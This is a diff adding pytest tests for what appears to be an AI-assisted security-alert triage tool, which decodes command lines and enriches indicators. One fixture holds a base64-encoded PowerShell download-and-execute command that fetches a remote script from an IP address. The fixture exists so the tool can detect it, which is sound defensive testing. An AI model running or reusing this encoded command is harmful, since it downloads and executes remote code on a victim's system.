@@ -1568,3 +1568,122 @@ def test_step_self_check_logs_input_and_output(caplog):
     assert "_run_self_check prompt" in caplog.text
     assert "_run_self_check result" in caplog.text
     assert "_step_self_check output" in caplog.text
+
+
+def test_investigate_decodes_command_line_and_enriches_embedded_ioc(tmp_path):
+    from app.schemas import ProcessExecutionFields
+
+    engine = get_engine(str(tmp_path / "test.db"))
+    init_db(engine)
+    alert_store = SQLiteAlertStore(engine)
+    ps_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"
+    alert = _make_alert(
+        rule_id="92009",
+        rule_description="Sysmon - process creation via encoded PowerShell command",
+        full_log="",
+        process=ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {ps_b64}"),
+    )
+    alert_store.save_raw_alert(alert)
+
+    registry = EnrichmentRegistry()
+    registry.register(_FakeIPProvider(result=_make_enrichment_result(
+        indicator_value="185.220.101.1", verdict=EnrichmentVerdict.MALICIOUS,
+    )))
+    siem = _FakeSIEMConnector(
+        agent_context=AgentContext(id="003", name="WIN-DESKTOP01", ip="172.20.10.5", status="active"),
+        rule_metadata=RuleMetadata(rule_id="92009", description="x", level=12),
+    )
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={
+            ExtractedIndicators: ExtractedIndicators(candidates=[]),
+            CorrelationDecision: CorrelationDecision(
+                pattern_type=PatternType.OTHER, follow_up_query=SearchTemplate.NONE_NEEDED
+            ),
+            OpenValueSearchProposal: OpenValueSearchProposal(search_value="185.220.101.1"),
+            RiskAssessment: RiskAssessment(
+                severity=Severity.HIGH, confidence=Confidence.HIGH,
+                rationale="Encoded PowerShell command downloads a script from a known-malicious IP.",
+            ),
+            DraftReportCanonical: DraftReportCanonical(
+                alert_summary="Encoded PowerShell process creation contacting a malicious IP.",
+                rationale="The decoded command line downloads and executes a remote script.",
+                recommended_actions=[RecommendedAction.TERMINATE_SUSPICIOUS_PROCESS, RecommendedAction.ISOLATE_HOST],
+            ),
+            DraftReportExperimental: DraftReportExperimental(
+                recommended_actions_freeform=["Block the IP at the perimeter"],
+                triage_verdict=TriageVerdict.TRUE_POSITIVE,
+                triage_rationale="Encoded download-and-execute pattern against a malicious IP.",
+            ),
+            SelfCheckResult: SelfCheckResult(audits=[
+                ClaimAudit(claim="Encoded PowerShell process creation contacting a malicious IP.", supported=True),
+                ClaimAudit(claim="The decoded command line downloads and executes a remote script.", supported=True),
+                ClaimAudit(claim=RecommendedAction.TERMINATE_SUSPICIOUS_PROCESS.value, supported=True),
+                ClaimAudit(claim=RecommendedAction.ISOLATE_HOST.value, supported=True),
+            ]),
+        },
+    )
+    analyst = AgenticAnalyst(siem=siem, alert_store=alert_store, enrichment_registry=registry, llm_client=llm_client)
+
+    report = analyst.investigate(alert)
+
+    assert report.command_analysis is not None
+    assert len(report.command_analysis.decoded_segments) == 1
+    assert "185.220.101.1" in report.command_analysis.decoded_segments[0].decoded
+    assert any(f.indicator_value == "185.220.101.1" for f in report.enrichment_findings)
+    assert any(f.verdict == EnrichmentVerdict.MALICIOUS for f in report.enrichment_findings)
+    assert report.status == ReportStatus.COMPLETE
+
+    risk_prompt = next(p for p, schema in llm_client.calls if schema is RiskAssessment)
+    assert "185.220.101.1" in risk_prompt
+
+
+def test_investigate_non_process_alert_is_fully_unaffected(tmp_path):
+    """Regression: an alert with no process fields behaves identically to before this feature."""
+    engine = get_engine(str(tmp_path / "test.db"))
+    init_db(engine)
+    alert_store = SQLiteAlertStore(engine)
+    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5", source_ip="203.0.113.5")
+    alert_store.save_raw_alert(alert)
+
+    registry = EnrichmentRegistry()
+    registry.register(_FakeIPProvider(result=_make_enrichment_result()))
+    siem = _FakeSIEMConnector(
+        agent_context=AgentContext(id="001", name="web-01", ip="10.0.0.5", status="active"),
+        rule_metadata=RuleMetadata(rule_id="5710", description="x", level=5),
+        search_results={"data.srcip": SearchResult(alerts=[], total_count=1), "rule.id": SearchResult(alerts=[], total_count=1)},
+    )
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={
+            ExtractedIndicators: ExtractedIndicators(candidates=[]),
+            CorrelationDecision: CorrelationDecision(
+                pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.NONE_NEEDED
+            ),
+            RiskAssessment: RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x"),
+            DraftReportCanonical: DraftReportCanonical(
+                alert_summary="Brute-force login attempts detected from 203.0.113.5 against web-01.",
+                rationale="High confidence based on repeated failed logins and a known-malicious source IP.",
+                recommended_actions=[RecommendedAction.BLOCK_SOURCE_IP, RecommendedAction.DISABLE_OR_RESET_ACCOUNT],
+            ),
+            DraftReportExperimental: DraftReportExperimental(
+                recommended_actions_freeform=["Consider geo-blocking the source region"],
+                triage_verdict=TriageVerdict.TRUE_POSITIVE,
+                triage_rationale="Pattern matches a known brute-force signature.",
+            ),
+            SelfCheckResult: SelfCheckResult(audits=[
+                ClaimAudit(claim="Brute-force login attempts detected from 203.0.113.5 against web-01.", supported=True),
+                ClaimAudit(claim="High confidence based on repeated failed logins and a known-malicious source IP.", supported=True),
+                ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
+                ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
+            ]),
+        },
+    )
+    analyst = AgenticAnalyst(siem=siem, alert_store=alert_store, enrichment_registry=registry, llm_client=llm_client)
+
+    report = analyst.investigate(alert)
+
+    assert report.command_analysis is None
+    assert report.status == ReportStatus.COMPLETE
+    risk_prompt = next(p for p, schema in llm_client.calls if schema is RiskAssessment)
+    assert "Command line:" not in risk_prompt
